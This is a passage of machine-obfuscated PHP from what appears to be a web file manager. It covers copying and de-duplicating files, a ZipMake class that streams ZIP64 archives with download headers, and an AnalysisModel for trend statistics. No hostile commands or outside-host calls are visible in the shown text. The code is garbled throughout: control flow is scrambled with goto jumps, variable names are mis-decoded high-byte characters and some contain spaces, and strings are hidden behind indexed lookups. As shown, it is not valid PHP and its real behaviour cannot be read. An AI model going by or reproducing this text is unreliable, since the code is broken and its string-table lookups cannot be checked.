$d’éœß‹Ñ = $this->_childrenList($bÙõ×¬ÈÁ); $d’éœß‹Ñ = array_to_keyvalue($d’éœß‹Ñ, $bÃ‰®èØ•¨[28]); foreach ($FŸ£§çš£é as $eéŸáÇÄã) { $aÆöÅ ô = $d’éœß‹Ñ[$eéŸáÇÄã[$bÃ‰®èØ•¨[28]]]; $dœ¾Ñè×ğ = $aÆöÅ ô[$bÃ‰®èØ•¨[369]]; $this->_copyApplyMeta($aÆöÅ ô, $A»‘¸Ÿ¾¸é); if ($eéŸáÇÄã[$bÃ‰®èØ•¨[29]] == $bÃ‰®èØ•¨[76]) { $eéŸáÇÄã[$bÃ‰®èØ•¨[75]] = $aµŒ¤©Íè->getPathInner($eéŸáÇÄã[$bÃ‰®èØ•¨[75]]); $this->_copyChildTo($aµŒ¤©Íè, $eéŸáÇÄã[$bÃ‰®èØ•¨[75]], $dœ¾Ñè×ğ, $CŒ§†Ëí†‡, $A»‘¸Ÿ¾¸é, $C‡ÖèƒÅÓÍ); } } goto eñ ØÁ•†è; EĞ„Ó’ÈŸ‰: $bÃ‰®èØ•¨ =& $_SERVER[¦·]; $fİ„»¼„àÜ = $this->sourceInfoCache($bÙõ×¬ÈÁ); $DëÍ¨¾âå‘ = $aµŒ¤©Íè->listPath($eÏœØùÇÇ, !1, !0); goto EœÓ…µ’Å; EœÓ…µ’Å: $FŸ£§çš£é = array_merge($DëÍ¨¾âå‘[$bÃ‰®èØ•¨[73]], $DëÍ¨¾âå‘[$bÃ‰®èØ•¨[74]]); $f Š¯›‘æÕ = $this->_addFiles($aµŒ¤©Íè, $DëÍ¨¾âå‘[$bÃ‰®èØ•¨[73]], $C‡ÖèƒÅÓÍ); $DâÙëëãÈÛ = array(); goto D÷—¨†œ; D÷—¨†œ: foreach ($FŸ£§çš£é as &$eéŸáÇÄã) { goto d¶™äˆ‡‡; BóŠ£œ»: $eéŸáÇÄã[$bÃ‰®èØ•¨[77]] = _get($eéŸáÇÄã, $bÃ‰®èØ•¨[77], 0); $eéŸáÇÄã[$bÃ‰®èØ•¨[419]] = _get($eéŸáÇÄã, $bÃ‰®èØ•¨[419], 0); if (!isset($eéŸáÇÄã[$bÃ‰®èØ•¨[542]]) && $eéŸáÇÄã[$bÃ‰®èØ•¨[419]]) { $A»‘¸Ÿ¾¸é[$bÃ‰®èØ•¨[539]][] = $eéŸáÇÄã[$bÃ‰®èØ•¨[419]]; } goto C†¦ƒ©İâ; d¶™äˆ‡‡: if (isset($f Š¯›‘æÕ[$eéŸáÇÄã[$bÃ‰®èØ•¨[28]]])) { $eéŸáÇÄã = $f Š¯›‘æÕ[$eéŸáÇÄã[$bÃ‰®èØ•¨[28]]]; } $eéŸáÇÄã[$bÃ‰®èØ•¨[370]] = $eéŸáÇÄã[$bÃ‰®èØ•¨[29]] == $bÃ‰®èØ•¨[76]; $eéŸáÇÄã[$bÃ‰®èØ•¨[372]] = _get($eéŸáÇÄã, $bÃ‰®èØ•¨[160], $bÃ‰®èØ•¨[33]); goto BóŠ£œ»; C†¦ƒ©İâ: if ($CŒ§†Ëí†‡) { $C¾¸øôÂ¼Ä = $this->fileNameExistCache($bÙõ×¬ÈÁ, $eéŸáÇÄã[$bÃ‰®èØ•¨[28]]); if ($C¾¸øôÂ¼Ä) { if ($eéŸáÇÄã[$bÃ‰®èØ•¨[370]] || $CŒ§†Ëí†‡ == REPEAT_SKIP) { continue; } if ($CŒ§†Ëí†‡ == REPEAT_REPLACE) { $aÆöÅ ô = $this->sourceInfoCache($C¾¸øôÂ¼Ä); $d¥…­ËÇÔ = $this->fileHistory($aÆöÅ ô, $eéŸáÇÄã[$bÃ‰®èØ•¨[419]], $eéŸáÇÄã[$bÃ‰®èØ•¨[77]]); if ($d¥…­ËÇÔ) { $A»‘¸Ÿ¾¸é[$bÃ‰®èØ•¨[503]][] = $eéŸáÇÄã[$bÃ‰®èØ•¨[419]]; } continue; } else { if ($CŒ§†Ëí†‡ == REPEAT_RENAME) { $eéŸáÇÄã[$bÃ‰®èØ•¨[28]] = $this->fileNameAutoCache($bÙõ×¬ÈÁ, $eéŸáÇÄã[$bÃ‰®èØ•¨[28]], $CŒ§†Ëí†‡, !1); } } } } if (!$eéŸáÇÄã[$bÃ‰®èØ•¨[370]] && $eéŸáÇÄã[$bÃ‰®èØ•¨[419]]) { $A»‘¸Ÿ¾¸é[$bÃ‰®èØ•¨[503]][] = $eéŸáÇÄã[$bÃ‰®èØ•¨[419]]; } $DâÙëëãÈÛ[] = $this->_makeItemData($eéŸáÇÄã, $fİ„»¼„àÜ, $eéŸáÇÄã[$bÃ‰®èØ•¨[28]]); goto Aê»èàî‚ò; Aê»èàî‚ò: } unset($eéŸáÇÄã); if (!empty($DâÙëëãÈÛ)) { $this->addAll($DâÙëëãÈÛ); } goto BˆÑĞ×´Ä; eñ ØÁ•†è: } private function _addFiles($E¬¡Óœ»‘¾, $d·ÕÊ¹íˆ, $eƒÎÕ„›î) { goto FˆªÈÛÅ›È; fÈ›æ£ğ‚: foreach ($D¬ìƒ§áßÚ as $fìé…ÂÃ±Ì) { if (!isset($f†ëñòòÄ«[$fìé…ÂÃ±Ì[$bÉ×ÕÒÙ­ô[163]]])) { continue; } $a¥ÆË‹ì = $f†ëñòòÄ«[$fìé…ÂÃ±Ì[$bÉ×ÕÒÙ­ô[163]]]; foreach ($a¥ÆË‹ì as &$bÂªâóöŒö) { $bÂªâóöŒö[$bÉ×ÕÒÙ­ô[419]] = $fìé…ÂÃ±Ì[$bÉ×ÕÒÙ­ô[419]]; $bÂªâóöŒö[$bÉ×ÕÒÙ­ô[542]] = !0; } unset($bÂªâóöŒö); } $EêÌ‰ö­–¦ = array(); foreach ($d·ÕÊ¹íˆ as $b¢æÍ¾Ğ±·) { if (isset($b¢æÍ¾Ğ±·[$bÉ×ÕÒÙ­ô[542]]) && $b¢æÍ¾Ğ±·[$bÉ×ÕÒÙ­ô[542]]) { continue; } $dÜŠï©ºÇÕ = $E¬¡Óœ»‘¾->getPathInner($b¢æÍ¾Ğ±·[$bÉ×ÕÒÙ­ô[75]]); $F¨£ù£¼áß = $A¢Ù“˜¦î->addFileMake($dÜŠï©ºÇÕ, $b¢æÍ¾Ğ±·[$bÉ×ÕÒÙ­ô[77]], $b¢æÍ¾Ğ±·[$bÉ×ÕÒÙ­ô[164]], $b¢æÍ¾Ğ±·[$bÉ×ÕÒÙ­ô[163]], $b¢æÍ¾Ğ±·[$bÉ×ÕÒÙ­ô[28]], $eƒÎÕ„›î); $EêÌ‰ö­–¦[] = $F¨£ù£¼áß; } goto eÍ†ƒìãĞƒ; b˜èíªìëí: $D¬ìƒ§áßÚ = $D¬ìƒ§áßÚ ? $D¬ìƒ§áßÚ : array(); foreach ($D¬ìƒ§áßÚ as $fìé…ÂÃ±Ì) { if (!isset($f†ëñòòÄ«[$fìé…ÂÃ±Ì[$bÉ×ÕÒÙ­ô[163]]])) { continue; } $C”´Ü·¬Û =& $f†ëñòòÄ«[$fìé…ÂÃ±Ì[$bÉ×ÕÒÙ­ô[163]]]; foreach ($C”´Ü·¬Û as &$bÂªâóöŒö) { $bÂªâóöŒö[$bÉ×ÕÒÙ­ô[419]] = $fìé…ÂÃ±Ì[$bÉ×ÕÒÙ­ô[419]]; } unset($bÂªâóöŒö); } $cÕ‹ìÀî†£ = array(); goto d†°º¦ƒ®”; CŠ†ùÑ´: foreach ($d·ÕÊ¹íˆ as &$bÂªâóöŒö) { goto fÜ˜‘¡¬ç; fáë‰ÆìÍµ: $a‘§Ğ‡õ = $E¬¡Óœ»‘¾->hashMd5($bÂªâóöŒö[$bÉ×ÕÒÙ­ô[75]]); if (strlen($a‘§Ğ‡õ) > 10 && !isset($f†ëñòòÄ«[$a‘§Ğ‡õ])) { $f†ëñòòÄ«[$a‘§Ğ‡õ] = array(); } $bÂªâóöŒö[$bÉ×ÕÒÙ­ô[164]] = $CÑ®´ö³ïÚ; goto CÃñêÅ•º¿; CÃñêÅ•º¿: $bÂªâóöŒö[$bÉ×ÕÒÙ­ô[163]] = $a‘§Ğ‡õ; Hook::trigger($bÉ×ÕÒÙ­ô[544], $bÂªâóöŒö); $f†ëñòòÄ«[$a‘§Ğ‡õ][] =& $bÂªâóöŒö; goto e”ôƒ¾‘ëÚ; e”ôƒ¾‘ëÚ: if (count($f†ëñòòÄ«[$a‘§Ğ‡õ]) > 1) { $bÂªâóöŒö[$bÉ×ÕÒÙ­ô[542]] = !0; } goto EÅ©¥œŠåÆ; fÜ˜‘¡¬ç: Hook::trigger($bÉ×ÕÒÙ­ô[543], $bÂªâóöŒö); $bÂªâóöŒö[$bÉ×ÕÒÙ­ô[75]] = $E¬¡Óœ»‘¾->getPathInner($bÂªâóöŒö[$bÉ×ÕÒÙ­ô[75]]); $CÑ®´ö³ïÚ = $E¬¡Óœ»‘¾->hashSimple($bÂªâóöŒö[$bÉ×ÕÒÙ­ô[75]]); goto fáë‰ÆìÍµ; EÅ©¥œŠåÆ: } unset($bÂªâóöŒö); $b†¦åˆÍù = array($bÉ×ÕÒÙ­ô[163] => array($bÉ×ÕÒÙ­ô[7], array_keys($f†ëñòòÄ«))); goto FÂƒèÚÏšÃ; eÍ†ƒìãĞƒ: $A¢Ù“˜¦î->addAll($EêÌ‰ö­–¦); $b†¦åˆÍù = array($bÉ×ÕÒÙ­ô[163] => array($bÉ×ÕÒÙ­ô[7], array_keys($f†ëñòòÄ«))); $D¬ìƒ§áßÚ = $A¢Ù“˜¦î->where($b†¦åˆÍù)->select(); goto b˜èíªìëí; d†°º¦ƒ®”: foreach ($d·ÕÊ¹íˆ as $aç÷ªÀÃÓ’) { $cÕ‹ìÀî†£[$aç÷ªÀÃÓ’[$bÉ×ÕÒÙ­ô[28]]] = $aç÷ªÀÃÓ’; } return $cÕ‹ìÀî†£; goto DĞƒÈÀ¢ì´; FÂƒèÚÏšÃ: $A¢Ù“˜¦î = Model($bÉ×ÕÒÙ­ô[545]); $D¬ìƒ§áßÚ = $A¢Ù“˜¦î->where($b†¦åˆÍù)->select(); $D¬ìƒ§áßÚ = $D¬ìƒ§áßÚ ? $D¬ìƒ§áßÚ : array(); goto fÈ›æ£ğ‚; FˆªÈÛÅ›È: $bÉ×ÕÒÙ­ô =& $_SERVER[¦·]; if (!$d·ÕÊ¹íˆ || count($d·ÕÊ¹íˆ) == 0) { return array(); } $f†ëñòòÄ« = array(); goto CŠ†ùÑ´; DĞƒÈÀ¢ì´: } } define($_SERVER[¦·][546], $_SERVER[¦·][547]); goto e¨ÇÕ¬‹ˆ¿; BİøíÍµ¾›: class ZipMake { const VERSION = "\60\56\x32\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($A·Ê–ÁøØ = null) { $eêå“¢Æì´ =& $_SERVER[¦·]; $this->outputStream = fopen($eêå“¢Æì´[2016], $eêå“¢Æì´[1230]); $this->outputName = $A·Ê–ÁøØ; $this->needHeaders = !0; } public function addFile($E‚‰©„Ò¨â, $dó‚ëšóãŠ) { goto aàõ†‡Õ¶§; aàõ†‡Õ¶§: $D³ÓÀ´ùî =& $_SERVER[¦·]; $E‚‰©„Ò¨â = $this->filterFilename($E‚‰©„Ò¨â); $e‹òë¥‚Ä = static::METHOD_STORE; goto fÒ†óÁ‹Ù; aÇÍÉ…µó‚: $this->addFileFooter($E‚‰©„Ò¨â, $e‹òë¥‚Ä, $cİ„ã–³š, $FËªõÑÉ¯±, $c®ãŸì¢á, $e¢å­ñÓ‡¢); goto A³îÄ‘—ä‘; fÒ†óÁ‹Ù: $e¢å­ñÓ‡¢ = $this->addFileHeader($E‚‰©„Ò¨â, $e‹òë¥‚Ä); $FËªõÑÉ¯± = $c®ãŸì¢á = filesize_64($dó‚ëšóãŠ); $AÕô±ÂÃ¼Æ = fopen($dó‚ëšóãŠ, $D³ÓÀ´ùî[2017]); goto e¿ê˜‹„ÇÒ; e¿ê˜‹„ÇÒ: while (!feof($AÕô±ÂÃ¼Æ)) { $D¹‘ª»Øòç = fread($AÕô±ÂÃ¼Æ, 1048576); $this->send($D¹‘ª»Øòç); } fclose($AÕô±ÂÃ¼Æ); $cİ„ã–³š = hexdec(hash_file($D³ÓÀ´ùî[2018], $dó‚ëšóãŠ)); goto aÇÍÉ…µó‚; A³îÄ‘—ä‘: } public function addFileFromStream($C¢¬áµçƒ, $eÍŸíó‹×) { goto E™•¸ä¿ªí; E¸Â™ÏÜŠ: $this->addFileFooter($C¢¬áµçƒ, $DËšÆ¤‘ÒŞ, $F¹Ï·’Ã«, $aĞ¿¯ˆö¢¦, $eªâ†•¬ˆ¡, $F’Ã‹ƒèÏÙ); goto Dƒ’­”š´µ; DÈ˜²î°ÕÆ: fseek($eÍŸíó‹×, 0, SEEK_END); $aĞ¿¯ˆö¢¦ = $eªâ†•¬ˆ¡ = ftell($eÍŸíó‹×); rewind($eÍŸíó‹×); goto FÁÆ«ÇÂ…; FÁÆ«ÇÂ…: $A‹±îÓèŸÆ = hash_init($_SERVER[¦·][2018]); while (!feof($eÍŸíó‹×)) { $e©ê˜¡è± = fread($eÍŸíó‹×, 1048576); hash_update($A‹±îÓèŸÆ, $e©ê˜¡è±); $this->send($e©ê˜¡è±); } $F¹Ï·’Ã« = hexdec(hash_final($A‹±îÓèŸÆ)); goto E¸Â™ÏÜŠ; E™•¸ä¿ªí: $C¢¬áµçƒ = $this->filterFilename($C¢¬áµçƒ); $DËšÆ¤‘ÒŞ = static::METHOD_STORE; $F’Ã‹ƒèÏÙ = $this->addFileHeader($C¢¬áµçƒ, $DËšÆ¤‘ÒŞ); goto DÈ˜²î°ÕÆ; Dƒ’­”š´µ: } public function finish() { foreach ($this->files as $AŒ›”¬Šó˜) { $this->addCdrFile($AŒ›”¬Šó˜); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($AÃ¥ËÔ—‹, $eÁàµéÕ£ˆ) { goto a…ÈğÛ´¬—; fí“öâ¯ƒ: return strlen($a¼À…ö„÷ë) + $DáåÅ¢–ä• + strlen($dÁßˆ®Ü²‘); goto D—‡¢ë´³; D¼®Â‡ÓçÀ: $a¡¯Ã±Ç… = $this->dosTime(time()); $B×¤ãœ Å’ = array(array($FÉó©¨Ç‡á[2020], static::FILE_HEADER_SIGNATURE), array($FÉó©¨Ç‡á[2021], static::ZIP_VERSION_64), array($FÉó©¨Ç‡á[2021], 8), array($FÉó©¨Ç‡á[2021], $eÁàµéÕ£ˆ), array($FÉó©¨Ç‡á[2020], $a¡¯Ã±Ç…), array($FÉó©¨Ç‡á[2020], 0), array($FÉó©¨Ç‡á[2020], 4294967295), array($FÉó©¨Ç‡á[2020], 4294967295), array($FÉó©¨Ç‡á[2021], $DáåÅ¢–ä•), array($FÉó©¨Ç‡á[2021], 32)); $AˆŠ¢»íÃ = array(array($FÉó©¨Ç‡á[2021], 1), array($FÉó©¨Ç‡á[2021], 28), array($FÉó©¨Ç‡á[2022], 0), array($FÉó©¨Ç‡á[2022], 0), array($FÉó©¨Ç‡á[2022], 0), array($FÉó©¨Ç‡á[2020], 0)); goto D¸è·¶¹øÁ; a…ÈğÛ´¬—: $FÉó©¨Ç‡á =& $_SERVER[¦·]; $AÃ¥ËÔ—‹ = preg_replace($FÉó©¨Ç‡á[2019], $FÉó©¨Ç‡á[33], $AÃ¥ËÔ—‹); $DáåÅ¢–ä• = strlen($AÃ¥ËÔ—‹); goto D¼®Â‡ÓçÀ; D¸è·¶¹øÁ: $a¼À…ö„÷ë = $this->packFields($B×¤ãœ Å’); $dÁßˆ®Ü²‘ = $this->packFields($AˆŠ¢»íÃ); $this->send($a¼À…ö„÷ë . $AÃ¥ËÔ—‹ . $dÁßˆ®Ü²‘); goto fí“öâ¯ƒ; D—‡¢ë´³: } protected function addFileFooter($Bè£‰îÂ‘†, $a‹ˆ˜ĞÑå†, $ağö¬Î‰™ó, $eŒÚº˜øµ, $Bñá‚½Şƒó, $AÀ˜®ĞˆÜª) { $Cİ‹ŸĞÈñ =& $_SERVER[¦·]; $E–³ô‚ÑŒ¸ = array(array($Cİ‹ŸĞÈñ[2020], static::DATA_DESCRIPTOR_SIGNATURE), array($Cİ‹ŸĞÈñ[2020], $ağö¬Î‰™ó), array($Cİ‹ŸĞÈñ[2022], $eŒÚº˜øµ), array($Cİ‹ŸĞÈñ[2022], $Bñá‚½Şƒó)); $aŞ¬Ğ¦âãË = $this->packFields($E–³ô‚ÑŒ¸); $this->send($aŞ¬Ğ¦âãË); $aÖëÏ¿õ¬½ = $AÀ˜®ĞˆÜª + $eŒÚº˜øµ + $A¿Î‰øÅÈ; $this->addToCdr($Bè£‰îÂ‘†, $a‹ˆ˜ĞÑå†, $ağö¬Î‰™ó, $eŒÚº˜øµ, $Bñá‚½Şƒó, $aÖëÏ¿õ¬½); } private function addToCdr($B˜ÃŠâõÏ, $CºîóÚ„„, $CçŠõë¾µ, $bõÚ•®Ñ­, $b¬ÓÖôé–Æ, $B¢¦ºñì¬¯) { $this->files[] = array($B˜ÃŠâõÏ, $CºîóÚ„„, $CçŠõë¾µ, $bõÚ•®Ñ­, $b¬ÓÖôé–Æ, $this->ofs); $this->ofs += $B¢¦ºñì¬¯; } protected function addCdrFile($cËï§ááÜ) { goto f§­–ğïÕ™; fÃİ›¶¨Ñ…: $this->send($D…‡ìŠ‘õ); $this->cdr_ofs += strlen($D…‡ìŠ‘õ); goto dĞõ„ìÜ«; B˜Œ‚¦Ì®©: $d£è´°œ» = $this->packFields($fõ•ÊàùêÁ); $D†¹Ç°â³Ã = $this->packFields($C…•ˆå„—´); $D…‡ìŠ‘õ = $d£è´°œ» . $D°›éåå… . $A†İï÷ . $D†¹Ç°â³Ã; goto fÃİ›¶¨Ñ…; f§­–ğïÕ™: $D¶ëÓî¿Åä =& $_SERVER[¦·]; list($D°›éåå…, $b‹†¼ø¯Ÿİ, $DŠ»®ã÷–¸, $F„Õ®³¢ÓÌ, $b‚Şó»‹“, $Aà‚íÅÇãË) = $cËï§ááÜ; $A†İï÷ = $D¶ëÓî¿Åä[33]; goto b«³¥ñ×‰‹; b«³¥ñ×‰‹: $e˜ÂÒµËÃ• = $this->dosTime(time()); $fõ•ÊàùêÁ = array(array($D¶ëÓî¿Åä[2020], static::CDR_FILE_SIGNATURE), array($D¶ëÓî¿Åä[2021], static::ZIP_VERSION_64), array($D¶ëÓî¿Åä[2021], static::ZIP_VERSION_64), array($D¶ëÓî¿Åä[2021], 8), array($D¶ëÓî¿Åä[2021], $b‹†¼ø¯Ÿİ), array($D¶ëÓî¿Åä[2020], $e˜ÂÒµËÃ•), array($D¶ëÓî¿Åä[2020], $DŠ»®ã÷–¸), array($D¶ëÓî¿Åä[2020], 4294967295), array($D¶ëÓî¿Åä[2020], 4294967295), array($D¶ëÓî¿Åä[2021], strlen($D°›éåå…)), array($D¶ëÓî¿Åä[2021], 32), array($D¶ëÓî¿Åä[2021], strlen($A†İï÷)), array($D¶ëÓî¿Åä[2021], 0), array($D¶ëÓî¿Åä[2021], 0), array($D¶ëÓî¿Åä[2020], 32), array($D¶ëÓî¿Åä[2020], 4294967295)); $C…•ˆå„—´ = array(array($D¶ëÓî¿Åä[2021], 1), array($D¶ëÓî¿Åä[2021], 28), array($D¶ëÓî¿Åä[2022], $b‚Şó»‹“), array($D¶ëÓî¿Åä[2022], $F„Õ®³¢ÓÌ), array($D¶ëÓî¿Åä[2022], $Aà‚íÅÇãË), array($D¶ëÓî¿Åä[2020], 0)); goto B˜Œ‚¦Ì®©; dĞõ„ìÜ«: } protected function addCdr64Eof() { goto B²õ…‹¢‘Â; B²õ…‹¢‘Â: $d…“ã”… =& $_SERVER[¦·]; $E¢„Åëë¾É = count($this->files); $fíê—ËÕ® = $this->cdr_ofs; goto a„øëù‘±¥; DŠ´š¢²Û: $this->send($EÙ’‚íòÊÚ); goto BèìÉÆ®±; a„øëù‘±¥: $E¾‘Ù‚†¹Ú = $this->ofs; $bÛ é¥íÆ = array(array($d…“ã”…[2020], static::ZIP64_CDR_EOF_SIGNATURE), array($d…“ã”…[2022], 44), array($d…“ã”…[2021], static::ZIP_VERSION_64), array($d…“ã”…[2021], static::ZIP_VERSION_64), array($d…“ã”…[2020], 0), array($d…“ã”…[2020], 0), array($d…“ã”…[2022], $E¢„Åëë¾É), array($d…“ã”…[2022], $E¢„Åëë¾É), array($d…“ã”…[2022], $fíê—ËÕ®), array($d…“ã”…[2022], $E¾‘Ù‚†¹Ú)); $EÙ’‚íòÊÚ = $this->packFields($bÛ é¥íÆ); goto DŠ´š¢²Û; BèìÉÆ®±: } protected function addCdr64Locator() { goto Dİ®˜£ºó×; Dİ®˜£ºó×: $dÙ¶ËÖèæ´ =& $_SERVER[¦·]; $a¶¡ˆÑŒÏƒ = count($this->files); $F©Ù·ª¦Œ¿ = $this->cdr_ofs; goto cŞ†‚ê¯¨—; cŞ†‚ê¯¨—: $dˆ©±‘‘ù‚ = $this->ofs; $F­ÏŠ¹„ùŞ = array(array($dÙ¶ËÖèæ´[2020], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($dÙ¶ËÖèæ´[2020], 0), array($dÙ¶ËÖèæ´[2022], $dˆ©±‘‘ù‚ + $F©Ù·ª¦Œ¿), array($dÙ¶ËÖèæ´[2020], 1)); $B“¶²¸ª = $this->packFields($F­ÏŠ¹„ùŞ); goto A›Ìõª‚Ç; A›Ìõª‚Ç: $this->send($B“¶²¸ª); goto bÊóº‹ÁšŸ; bÊóº‹ÁšŸ: } protected function addCdrEof() { goto F…ã’ô­˜ª; Bƒ‘†¼Ò: $BĞ°øÈñ¦« = $this->ofs; $f÷¨‘Ü„ÀÅ = $d—¨Á”Ÿå…[33]; $cæŒÃ‰‹¾… = array(array($d—¨Á”Ÿå…[2020], static::CDR_EOF_SIGNATURE), array($d—¨Á”Ÿå…[2021], 0), array($d—¨Á”Ÿå…[2021], 0), array($d—¨Á”Ÿå…[2021], $F¸¦‡­Òì), array($d—¨Á”Ÿå…[2021], $F¸¦‡­Òì), array($d—¨Á”Ÿå…[2020], 4294967295), array($d—¨Á”Ÿå…[2020], 4294967295), array($d—¨Á”Ÿå…[2021], strlen($f÷¨‘Ü„ÀÅ))); goto Bãëñë§ïù; Bãëñë§ïù: $B‰Ïİ¾«É = $this->packFields($cæŒÃ‰‹¾…) . $f÷¨‘Ü„ÀÅ; $this->send($B‰Ïİ¾«É); goto e²ù¼ÔÇ¯; F…ã’ô­˜ª: $d—¨Á”Ÿå… =& $_SERVER[¦·]; $F¸¦‡­Òì = count($this->files); $cÆ±¿ªë¬— = $this->cdr_ofs; goto Bƒ‘†¼Ò; e²ù¼ÔÇ¯: } protected function addCdr() { foreach ($this->files as $DÓÑŒÈÔõê) { $this->addCdrFile($DÓÑŒÈÔõê); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $B³Š³Ó½Œà =& $_SERVER[¦·]; $b³ö÷›ä» = $B³Š³Ó½Œà[202]; if ($this->outputName) { $eªëÀ·Àå = trim(str_replace(array($B³Š³Ó½Œà[113], $B³Š³Ó½Œà[55], $B³Š³Ó½Œà[93], $B³Š³Ó½Œà[67], $B³Š³Ó½Œà[217], $B³Š³Ó½Œà[995]), $B³Š³Ó½Œà[33], $this->outputName)); $Bæ’ñ”•‡Ò = rawurlencode($eªëÀ·Àå); $b³ö÷›ä» .= "\73\x20\146\x69\x6c\x65\x6e\x61\x6d\x65\52\75\x75\x74\x66\x2d\x38\x27\47{$Bæ’ñ”•‡Ò}"; } $f“âæø·ÏÃ = array($B³Š³Ó½Œà[199] => $B³Š³Ó½Œà[2023], $B³Š³Ó½Œà[2024] => $b³ö÷›ä», $B³Š³Ó½Œà[2025] => $B³Š³Ó½Œà[2026], $B³Š³Ó½Œà[2027] => $B³Š³Ó½Œà[2028], $B³Š³Ó½Œà[2029] => $B³Š³Ó½Œà[2030]); foreach ($f“âæø·ÏÃ as $aîÜ«˜ä—ƒ => $fÑ´¢Ó¦âê) { header($aîÜ«˜ä—ƒ . $B³Š³Ó½Œà[882] . $fÑ´¢Ó¦âê); } } protected function send($E³„†ÎËœ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $E³„†ÎËœ); } protected final function dosTime($A²¢¡Çï‰–) { $c©íæ‰ŸÚ» =& $_SERVER[¦·]; $D”‚Ò•¿â = getdate($A²¢¡Çï‰–); if ($D”‚Ò•¿â[$c©íæ‰ŸÚ»[1730]] < 1980) { $D”‚Ò•¿â = array($c©íæ‰ŸÚ»[1730] => 1980, $c©íæ‰ŸÚ»[2031] => 1, $c©íæ‰ŸÚ»[2032] => 1, $c©íæ‰ŸÚ»[2033] => 0, $c©íæ‰ŸÚ»[2034] => 0, $c©íæ‰ŸÚ»[2035] => 0); } $D”‚Ò•¿â[$c©íæ‰ŸÚ»[1730]] -= 1980; return $D”‚Ò•¿â[$c©íæ‰ŸÚ»[1730]] << 25 | $D”‚Ò•¿â[$c©íæ‰ŸÚ»[2031]] << 21 | $D”‚Ò•¿â[$c©íæ‰ŸÚ»[2032]] << 16 | $D”‚Ò•¿â[$c©íæ‰ŸÚ»[2033]] << 11 | $D”‚Ò•¿â[$c©íæ‰ŸÚ»[2034]] << 5 | $D”‚Ò•¿â[$c©íæ‰ŸÚ»[2035]] >> 1; } protected function packFields($DÌÎóçÖ†·) { $fê¨©´³ =& $_SERVER[¦·]; $CÁã¸Õƒ¯ = $fê¨©´³[33]; $b£¸ñ†ƒ³Å = array(); foreach ($DÌÎóçÖ†· as $CĞî‚ŸˆŸ’) { $CÁã¸Õƒ¯ .= $CĞî‚ŸˆŸ’[0]; $b£¸ñ†ƒ³Å[] = $CĞî‚ŸˆŸ’[1]; } array_unshift($b£¸ñ†ƒ³Å, $CÁã¸Õƒ¯); return call_user_func_array($fê¨©´³[2036], $b£¸ñ†ƒ³Å); } protected function filterFilename($bÃÌ‰Î­ˆĞ) { $FÌœ™×¯É• =& $_SERVER[¦·]; return str_replace(array($FÌœ™×¯É•[93], $FÌœ™×¯É•[4], $FÌœ™×¯É•[176], $FÌœ™×¯É•[69], $FÌœ™×¯É•[113], $FÌœ™×¯É•[927], $FÌœ™×¯É•[930], $FÌœ™×¯É•[271]), $FÌœ™×¯É•[70], $bÃÌ‰Î­ˆĞ); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($fóò›áñœš) { $BŞ¹ğ‹‘Üª =& $_SERVER[¦·]; $dßòµÃØÌÍ = array($BŞ¹ğ‹‘Üª[536] => array($BŞ¹ğ‹‘Üª[29] => $BŞ¹ğ‹‘Üª[2037], $BŞ¹ğ‹‘Üª[261] => array($BŞ¹ğ‹‘Üª[210], $BŞ¹ğ‹‘Üª[701], $BŞ¹ğ‹‘Üª[2038], $BŞ¹ğ‹‘Üª[2039])), $BŞ¹ğ‹‘Üª[2040] => array($BŞ¹ğ‹‘Üª[29] => $BŞ¹ğ‹‘Üª[2041], $BŞ¹ğ‹‘Üª[261] => array($BŞ¹ğ‹‘Üª[210], $BŞ¹ğ‹‘Üª[699], $BŞ¹ğ‹‘Üª[2042], $BŞ¹ğ‹‘Üª[2043], $BŞ¹ğ‹‘Üª[2044]))); if (!isset($dßòµÃØÌÍ[$fóò›áñœš])) { return !1; } $this->optionType = $dßòµÃØÌÍ[$fóò›áñœš][$BŞ¹ğ‹‘Üª[29]]; $this->field = $dßòµÃØÌÍ[$fóò›áñœš][$BŞ¹ğ‹‘Üª[261]]; return !0; } public function listData($bÉò‹ä › = false, $B«àÂÍÑ = "\x6d\157\144\x69\146\171\x54\151\x6d\145", $aíè‚ß‹ˆ = false) { return parent::listData($bÉò‹ä ›, $B«àÂÍÑ, $aíè‚ß‹ˆ); } public function trendList($fÜÆ«Ú•Ç) { goto dÌãÁº‘ÇÔ; CªØÁƒŠÜ°: if (!isset($D´Œ“šĞÂŞ)) { $cäÃó«İ½ = $fÜÆ«Ú•Ç == $A·îâ©­¯•[536] ? $A·îâ©­¯•[479] : $A·îâ©­¯•[753]; $D´Œ“šĞÂŞ = Model($cäÃó«İ½)->min($A·îâ©­¯•[187]); } $F™ö‚±†Æ‚ = $A·îâ©­¯•[2047] . ucfirst($fÜÆ«Ú•Ç); $d „‘âµà… = $this->dateList($D´Œ“šĞÂŞ); goto bœ¾µƒšË¤; bœ¾µƒšË¤: foreach ($d „‘âµà… as $C“±Ü¼ßë) { $this->{$F™ö‚±†Æ‚}($C“±Ü¼ßë); } return $this->listData(); goto d’êßâŠº; dÌãÁº‘ÇÔ: $A·îâ©­¯• =& $_SERVER[¦·]; $D‘Î¶ÍïæÅ = $this->listData(); if ($D‘Î¶ÍïæÅ) { $D®ÅÃ‘Î¶ƒ = end($D‘Î¶ÍïæÅ); $C“±Ü¼ßë = date($A·îâ©­¯•[2045], strtotime($A·îâ©­¯•[2046])); if ($D®ÅÃ‘Î¶ƒ[$A·îâ©­¯•[210]] == $C“±Ü¼ßë) { return $D‘Î¶ÍïæÅ; } $D´Œ“šĞÂŞ = strtotime($D®ÅÃ‘Î¶ƒ[$A·îâ©­¯•[210]]); } goto CªØÁƒŠÜ°; d’êßâŠº: } private function dateList($fçœ½ÆéÓÚ) { $B¾Ÿƒ£îçã =& 